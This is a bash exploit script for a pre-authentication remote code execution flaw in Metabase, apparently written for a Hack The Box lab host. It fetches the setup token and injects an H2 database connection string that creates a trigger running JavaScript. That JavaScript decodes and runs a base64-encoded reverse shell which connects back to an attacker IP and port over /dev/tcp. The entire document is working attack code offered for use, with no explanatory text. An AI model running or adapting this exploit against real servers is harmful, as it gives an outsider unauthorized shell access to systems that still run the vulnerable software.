LOCAL_IP=$1
LOCAL_PORT=$2
if [ -z $LOCAL_IP ]
then
    echo "./exploit.sh <local-ip> <local-port>"
    exit 1
fi
if [ -z $LOCAL_PORT ]
then
    echo "./exploit.sh <local-ip> <local-port>"
    exit 1
fi

REMOTE="http://data.analytical.htb"
# Retrieve the session token
PROPERTIES_URL=/api/session/properties
SETUP_TOKEN=$(curl -s $REMOTE$PROPERTIES_URL |jq '."setup-token"'| tr -d "\"")

# Prepare the payload to abuse the pre-auth RCE
SHELL="bash -i >&/dev/tcp/$LOCAL_IP/$LOCAL_PORT 0>&1"
PAYLOAD_B64=$(echo $SHELL | base64)

cat >payload.json <<EOF
{
    "token": "$SETUP_TOKEN",
    "details":
    {
        "is_on_demand": false,
        "is_full_sync": false,
        "is_sample": false,
        "cache_ttl": null,
        "refingerprint": false,
        "auto_run_queries": true,
        "schedules":
        {},
        "details":
        {
            "db": "zip:/app/metabase.jar!/sample-database.db;MODE=MSSQLServer;TRACE_LEVEL_SYSTEM_OUT=1\\\\;CREATE TRIGGER pwnshell BEFORE SELECT ON INFORMATION_SCHEMA.TABLES AS \$\$//javascript\njava.lang.Runtime.getRuntime().exec('bash -c {echo,$PAYLOAD_B64}|{base64,-d}|{bash,-i}')\n\$\$--=x",           
            "advanced-options": false,
            "ssl": true
        },
        "name": "an-sec-research-team",
        "engine": "h2"
    }
}
EOF

VALIDATE_URL=/api/setup/validate
curl $REMOTE$VALIDATE_URL -d "@payload.json" -H "Content-Type: application/json"
